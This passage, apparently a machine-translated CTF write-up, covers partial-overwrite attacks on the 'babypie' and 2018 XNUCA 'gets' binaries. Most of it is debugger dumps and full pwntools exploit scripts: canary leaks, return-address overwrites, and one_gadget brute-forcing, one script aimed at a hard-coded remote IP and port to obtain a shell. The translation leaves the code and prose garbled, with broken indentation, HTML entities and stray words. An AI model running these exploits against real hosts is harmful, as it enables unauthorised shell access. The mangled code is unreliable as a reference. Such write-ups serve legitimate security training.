 RSI  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')

 R8   0x7f206cb22700 ◂— 0x7f206cb22700

 R9   0x3e

 R10  0x73

 R11  0x246

 R12  0x55dc43694830 ◂— xor    ebp, ebp

 R13  0x7fff9aa3b050 ◂— 0x1

 R14  0x0

 R15  0x0

 RBP  0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15

 RSP  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')

 RIP  0x55dc43694a1e ◂— call   0x55dc436947f0

────────────────────────────────────────────────── ─ [DISASM] ─────────────────────────────────────────────────── ──────
   0x55dc43694a08    call   0x55dc436947e0

 

   0x55dc43694a0d    lea    rax, [rbp - 0x30]

   0x55dc43694a11    mov    edx, 0x60

   0x55dc43694a16    mov    rsi, rax

   0x55dc43694a19    mov    edi, 0

 ► 0x55dc43694a1e    call   0x55dc436947f0

 

   0x55dc43694a23    mov    eax, 0

0x55dc43694a28 mov rcx, qword ptr [rbp - 8]
   0x55dc43694a2c    xor    rcx, qword ptr fs:[0x28]

   0x55dc43694a35    je     0x55dc43694a3c

 

   0x55dc43694a37    call   0x55dc436947c0

────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────

00:0000│ rax rsi rsp  0x7fff9aa3af20 ◂— 0x6161616161616161 ('aaaaaaaa')

... ↓

05:0028│              0x7fff9aa3af48 ◂— 0xbfe0cfbabccd2861

06:0030│ rbp          0x7fff9aa3af50 —▸ 0x7fff9aa3af70 —▸ 0x55dc43694a80 ◂— push   r15

07:0038│              0x7fff9aa3af58 —▸ 0x55dc43694a6a ◂— mov    eax, 0

pwndbg> x/10i (0x0A3E+0x55dc43694000) 

   0x55dc43694a3e:	push   rbp

   0x55dc43694a3f:	mov    rbp,rsp

   0x55dc43694a42:	lea    rdi,[rip+0xd7]        # 0x55dc43694b20

   0x55dc43694a49:	call   0x55dc436947d0

   0x55dc43694a4e:	nop

   0x55dc43694a4f:	pop    rbp

0x55dc43694a50: right
   0x55dc43694a51:	push   rbp

   0x55dc43694a52:	mov    rbp,rsp

   0x55dc43694a55:	sub    rsp,0x10

```

It can be found that the return address at this time is different from the 16 bits of the address of the get shell function. If the lower 16 bits are set to `0x?A3E`, there is a certain probability of getting shell.


The final script is as follows:
```python

#!/usr/bin/env python

# -*- coding: utf-8 -*-



from pwn import *

#  context.log_level = "debug"

context.terminal = ["deepin-terminal", "-x", "sh", "-c"]



while True:

    try:

        io = process("./babypie", timeout = 1)



# gdb.attach (I)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))

io.recvuntil (&#39;a&#39; * (0x30 - 0x8 + 1))
canary = &#39;0&#39; + io.recvn (7)
        success(canary.encode('hex'))



# gdb.attach (I)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')



io.interactive ()
    except Exception as e:

io.close ()
print e
```

It should be noted that this technique is not only effective on the stack, but also an effective means of bypassing address randomization on the heap.


### 2018-XNUCA-gets



This topic is also very interesting, as follows


```c

__int64 __fastcall main(__int64 a1, char **a2, char **a3)

{

char * v4; // [rsp + 0h] [rbp-18h]


gets ((char *) &amp; v4);
  return 0LL;

}

```



The program is so small that there is obviously a stack overflow vulnerability, but there is no leak. .

#### Determining protection


First take a look at the protection of the program


```c

[*] '/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'

    Arch:     amd64-64-little

    RELRO:    Full RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)



```



It is better that the program does not have a canary. Naturally, we can easily control the EIP of the program, but it is a problem to control where.


#### Analysis


We know the basic execution flow of the program through the basic execution flow (executable part) of ELF. At the same time, we find that there are two function return addresses on the stack.


`` `asm
pwndbg> stack 25

00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax

01:0008│      0x7fffffffe3a0 ◂— 0x1

02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')

03:0018│      0x7fffffffe3b0 ◂— 0x1f7ffcca0

04:0020│      0x7fffffffe3b8 —▸ 0x400420 ◂— sub    rsp, 0x18

05:0028│      0x7fffffffe3c0 ◂— 0x0

06:0030│      0x7fffffffe3c8 ◂— 0xf086047f3fb49558

07:0038│      0x7fffffffe3d0 —▸ 0x400440 ◂— xor    ebp, ebp

08:0040│      0x7fffffffe3d8 —▸ 0x7fffffffe470 ◂— 0x1

09:0048│      0x7fffffffe3e0 ◂— 0x0

... ↓

0b:0058│      0x7fffffffe3f0 ◂— 0xf79fb00f2749558

0c:0060│      0x7fffffffe3f8 ◂— 0xf79ebba9ae49558

0d:0068│      0x7fffffffe400 ◂— 0x0

... ↓

10: 0080│ 0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 (&#39;AUTOMOTIVE&#39;)
11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0

12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0

```



Where `__libc_start_main+240` is in libc and `_dl_init+139` is in ld


```

0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so

0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so

0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so

0x7ffff7dd1000 0x7ffff7dd3000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd3000 0x7ffff7dd7000 rw-p 4000 0
0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so

```



A more natural idea is that we use partial overwrite to modify these two addresses to a location that gets the shell, which is naturally a Onegadget. So which one do we cover? ?


Let&#39;s first analyze the base address `0x7ffff7a0d000` of `libc`. We generally want to cover the bytes, at least 1 nibble to be able to get jumped to onegadget. However, when the program reads it, it is read by `gets`, which means that `\x00` will definitely exist at the end of the string.


When we cover the bytes, we must cover the integer multiples, that is, we will cover at least 3 bytes, and let&#39;s take a look at the address `0x7ffff7a2d830` of `__libc_start_main+240`. If it covers 3 bytes, it is `0x7ffff700xxxx `, has been less than the base address of libc, there is no code position deliberately executed before.


In general, the offset of libc_start_main in libc is not too bad, so obviously if we overwrite `__libc_start_main+240`, it is obviously impossible.


And the base address of ld? If we overwrite `_dl_init+139` on the stack, it is `0x7ffff700xxxx`. Looking at the above memory layout, we can find that `libc` is in the low address direction of `ld`, so when randomizing, it is very likely that the third byte of libc is `\x00`.


For example, the current offset between the two is


```

0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000

```



Then if ld is loaded to `0x7ffff73ca000`, then the starting address of `libc` is obviously `0x7ffff7000000`.


Therefore, we have a good reason to choose to overwrite the `_dl_init+139` stored on the stack. So what is it covered? Still don&#39;t know. Because we don&#39;t know what the library version of libc is,


We can cover the coverage first and see if the program will crash. After all, it is very likely that the code in the libc library will be executed.


```python

from pwn import *

context.terminal = ['tmux', 'split', '-h']

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

if args['DEBUG']:

    context.log_level = 'debug'

elfpath = './gets'

context.binary = elfpath



elf = ELF (elf path)
bits = elf.bits





def exp(ip, port):

    for i in range(0x1000):

        if args['REMOTE']:

            p = remote(ip, port)

        else:

            p = process(elfpath, timeout=2)

        # gdb.attach(p)

        try:

            payload = 0x18 * 'a' + p64(0x40059B)

            for _ in range(2):

                payload += 'a' * 8 * 5 + p64(0x40059B)

            payload += 'a' * 8 * 5 + p16(i)

            p.sendline(payload)

            data = p.recv()

            print data

            p.interactive()

            p.close()

        except Exception:

            p.close()

            continue





if __name__ == "__main__":

    exp('106.75.4.189', 35273)

```



Finally, we found the following error. On the one hand, we can judge that this is definitely the 2.23 version of libc; on the other hand, we can finally locate the version of libc by `(cfree+0x4c)[0x7f57b6f9253c]`.


```

======= Backtrace: =========

/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]

/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]

/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]

/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]

[0x7ffdec480f20]

======= Memory map: ========

00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets

00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets

00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]

7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0

7f57b0021000-7f57b4000000 ---p 00000000 00:00 0

7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1

7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1

7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447 /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so

7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so

7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so

7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421 /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so

7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so

7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so

7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0

7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]

7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]

7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]

ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

```



After determining the version of libc, we can choose one_gadget, here I choose the first one, the lower address.


```shell

➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6

0x45216 execve("/bin/sh", rsp+0x30, environ)

constraints:

  rax == NULL



0x4526a execve("/bin/sh", rsp+0x30, environ)

constraints:

  [rsp+0x30] == NULL



0xf02a4 execve("/bin/sh", rsp+0x50, environ)

constraints:

  [rsp+0x50] == NULL



0xf1147 execve("/bin/sh", rsp+0x70, environ)

constraints:

  [rsp+0x70] == NULL



```



Continue to blast with the following exp,


```python

from pwn import *

context.terminal = ['tmux', 'split', '-h']

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

if args['DEBUG']:

    context.log_level = 'debug'

elfpath = './gets'

context.binary = elfpath



elf = ELF (elf path)
bits = elf.bits





def exp(ip, port):

    for i in range(0x1000):

        if args['REMOTE']:

            p = remote(ip, port)

        else:

            p = process(elfpath, timeout=2)

        # gdb.attach(p)

        try:

            payload = 0x18 * 'a' + p64(0x40059B)

            for _ in range(2):

                payload += 'a' * 8 * 5 + p64(0x40059B)

            payload += 'a' * 8 * 5 + '\x16\02'

            p.sendline(payload)



p.sendline (&#39;ls&#39;)
            data = p.recv()

            print data

            p.interactive()

            p.close()

        except Exception:

            p.close()

            continue





if __name__ == "__main__":

    exp('106.75.4.189', 35273)

```



Finally get the shell.


```python

$ ls
exp.py  gets

```



### Title